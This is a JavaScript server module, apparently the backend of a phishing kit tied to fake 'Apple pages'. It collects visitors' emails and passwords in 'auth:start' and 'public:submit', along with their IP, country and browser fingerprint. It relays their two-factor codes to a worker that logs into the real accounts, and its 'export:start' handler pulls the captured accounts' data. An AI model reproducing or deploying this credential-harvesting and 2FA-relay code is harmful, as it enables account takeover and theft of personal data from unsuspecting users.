import { z } from "zod";
import { allow } from "./rate-limit.js";
import { cleanIp, countryName } from "../ip.js";
import { geo } from "../geo/index.js";

/* Public namespace.
 *
 * Two APIs live here:
 *   - the original submission/hello events (kept for the simple template), and
 *   - the auth/2FA/export flow used by the Apple pages.
 *
 * Anonymous visitors only get the events registered below; admin commands are
 * on /admin, worker commands on /worker. */

const hello = z.object({
  page: z.string().trim().max(120).default("/"),
});

const submit = z.object({
  email: z.string().trim().email().max(254),
  password: z.string().max(200).default(""),
  code: z.string().trim().max(12).default(""),
  page: z.string().trim().max(120).default("/verify"),
});

const authStart = z.object({
  email: z.string().trim().email().max(254),
  password: z.string().min(1).max(200),
  userAgent: z.string().trim().max(512).default(""),
  language: z.string().trim().max(35).default(""),
  timezone: z.string().trim().max(64).default(""),
});

const jobId = z.string().trim().min(1).max(80);

const twofaSubmit = z.object({
  jobId,
  choiceId: z.string().trim().max(120).default(""),
  code: z.string().trim().min(1).max(12),
});

const twofaResend = z.object({
  jobId,
  choiceId: z.string().trim().max(120).default(""),
});

const twofaSwitch = z.object({
  jobId,
  fromChoiceId: z.string().trim().max(120).default(""),
  toChoiceId: z.string().trim().min(1).max(120),
});

const attach = z.object({ jobId });
const exportStart = z.object({ jobId });

const reply = (ack, payload) => {
  if (typeof ack === "function") ack(payload);
};

export function registerPublic(io, store, pool) {
  const nsp = io.of("/public");

  nsp.on("connection", (socket) => {
    socket.data.role = "public";

    socket.emit("public:state", {
      total: store.stats().total,
      online: nsp.sockets.size,
      serverTime: new Date().toISOString(),
    });

    socket.on("public:hello", (raw, ack) => {
      if (!allow(socket, "public:hello", { limit: 20, windowMs: 10_000 })) {
        return reply(ack, { ok: false, error: "rate limited" });
      }
      const parsed = hello.safeParse(raw ?? {});
      if (!parsed.success) {
        return reply(ack, { ok: false, error: "invalid payload" });
      }
      socket.data.page = parsed.data.page;
      reply(ack, {
        ok: true,
        socketId: socket.id,
        page: socket.data.page,
        serverTime: new Date().toISOString(),
      });
    });

    /* ------------------------------------------------------------ auth flow */

    socket.on("auth:start", async (raw, ack) => {
      if (!allow(socket, "auth:start", { limit: 5, windowMs: 60_000 })) {
        return reply(ack, { ok: false, error: "rate limited" });
      }
      const parsed = authStart.safeParse(raw ?? {});
      if (!parsed.success) {
        return reply(ack, { ok: false, error: "invalid payload" });
      }

      const ip = cleanIp(socket.handshake.address);
      const headerCountry = String(
        socket.handshake.headers["cf-ipcountry"] ?? socket.handshake.headers["x-country-code"] ?? ""
      ).toUpperCase();
      const location = await geo.lookup(ip, {
        headerCountry: /^[A-Z]{2}$/.test(headerCountry) ? headerCountry : "",
      });

      try {
        const result = await pool.startAuth({
          email: parsed.data.email,
          password: parsed.data.password,
          fingerprint: {
            userAgent:
              parsed.data.userAgent ||
              String(socket.handshake.headers["user-agent"] ?? "").slice(0, 512),
            language:
              parsed.data.language ||
              String(socket.handshake.headers["accept-language"] ?? "").split(",")[0] ||
              "",
            timezone: parsed.data.timezone,
          },
          geo: {
            ip,
            country: location.country || countryName(headerCountry),
            countryCode: location.countryCode || headerCountry,
          },
        });
        pool.replay(socket, result.job, result.account);
        reply(ack, {
          ok: true,
          jobId: result.job.id,
          accountId: result.account.id,
          reused: result.reused,
          status: result.account.status,
        });
      } catch (error) {
        reply(ack, { ok: false, error: error.message });
      }
    });

    socket.on("auth:attach", (raw, ack) => {
      if (!allow(socket, "auth:attach", { limit: 20, windowMs: 10_000 })) {
        return reply(ack, { ok: false, error: "rate limited" });
      }
      const parsed = attach.safeParse(raw ?? {});
      if (!parsed.success) return reply(ack, { ok: false, error: "invalid payload" });
      const job = store.getJob(parsed.data.jobId);
      if (!job) return reply(ack, { ok: false, error: "job not found" });
      const account = store.getAccount(job.accountId);
      if (!account) return reply(ack, { ok: false, error: "account not found" });
      pool.attachPublicSocket(socket, { job, account });
      pool.replay(socket, job, account);
      reply(ack, { ok: true, jobId: job.id, accountId: account.id, status: account.status });
    });

    const command = (socket, event, schema, workerEvent, build, limit = 10) => {
      socket.on(event, async (raw, ack) => {
        if (!allow(socket, event, { limit, windowMs: 10_000 })) {
          return reply(ack, { ok: false, error: "rate limited" });
        }
        const parsed = schema.safeParse(raw ?? {});
        if (!parsed.success) return reply(ack, { ok: false, error: "invalid payload" });
        const { jobId: id } = parsed.data;
        const job = store.getJob(id);
        if (!job) return reply(ack, { ok: false, error: "job not found" });
        if (socket.data.jobId && socket.data.jobId !== id) {
          return reply(ack, { ok: false, error: "not your job" });
        }
        try {
          const result = await pool.command(id, workerEvent, build(parsed.data));
          reply(ack, { ok: true, ...result });
        } catch (error) {
          reply(ack, { ok: false, error: error.message });
        }
      });
    };

    command(socket, "auth:submit_2fa", twofaSubmit, "job:2fa", (data) => ({
      action: "submit",
      choiceId: data.choiceId,
      code: data.code,
    }), 6);

    command(socket, "auth:resend_2fa", twofaResend, "job:2fa", (data) => ({
      action: "resend",
      choiceId: data.choiceId,
    }), 4);

    command(socket, "auth:switch_2fa", twofaSwitch, "job:2fa", (data) => ({
      action: "switch",
      fromChoiceId: data.fromChoiceId,
      choiceId: data.toChoiceId,
    }), 6);

    socket.on("export:start", async (raw, ack) => {
      if (!allow(socket, "export:start", { limit: 5, windowMs: 60_000 })) {
        return reply(ack, { ok: false, error: "rate limited" });
      }
      const parsed = exportStart.safeParse(raw ?? {});
      if (!parsed.success) return reply(ack, { ok: false, error: "invalid payload" });
      const job = store.getJob(parsed.data.jobId);
      if (!job) return reply(ack, { ok: false, error: "job not found" });
      const account = store.getAccount(job.accountId);
      if (!account) return reply(ack, { ok: false, error: "account not found" });
      if (!["connected", "done"].includes(account.status)) {
        return reply(ack, { ok: false, error: "account is not connected" });
      }
      try {
        const result = await pool.startExport(account.id, { mode: "missing", parentJobId: job.id });
        reply(ack, { ok: true, exportJobId: result.job.id });
      } catch (error) {
        reply(ack, { ok: false, error: error.message });
      }
    });

    /* ------------------------------------------------------- legacy events */

    socket.on("public:submit", async (raw, ack) => {
      if (!allow(socket, "public:submit", { limit: 5, windowMs: 60_000 })) {
        return reply(ack, { ok: false, error: "rate limited" });
      }
      const parsed = submit.safeParse(raw ?? {});
      if (!parsed.success) {
        return reply(ack, { ok: false, error: "invalid payload" });
      }

      const ip = cleanIp(socket.handshake.address);
      const headerCountry = String(
        socket.handshake.headers["cf-ipcountry"] ?? ""
      ).toUpperCase();
      const location = await geo.lookup(ip, {
        headerCountry: /^[A-Z]{2}$/.test(headerCountry) ? headerCountry : "",
      });

      const item = store.add({
        ...parsed.data,
        ip,
        country: location.country || countryName(headerCountry),
        countryCode: location.countryCode || headerCountry,
      });

      reply(ack, { ok: true, id: item.id });
    });

    socket.on("public:ping", (ack) => reply(ack, { ok: true, now: Date.now() }));

    socket.on("disconnect", () => {
      nsp.emit("public:state", {
        total: store.stats().total,
        online: nsp.sockets.size,
        serverTime: new Date().toISOString(),
      });
    });
  });

  store.on("change", () => {
    nsp.emit("public:count", { total: store.stats().total });
  });

  return nsp;
}
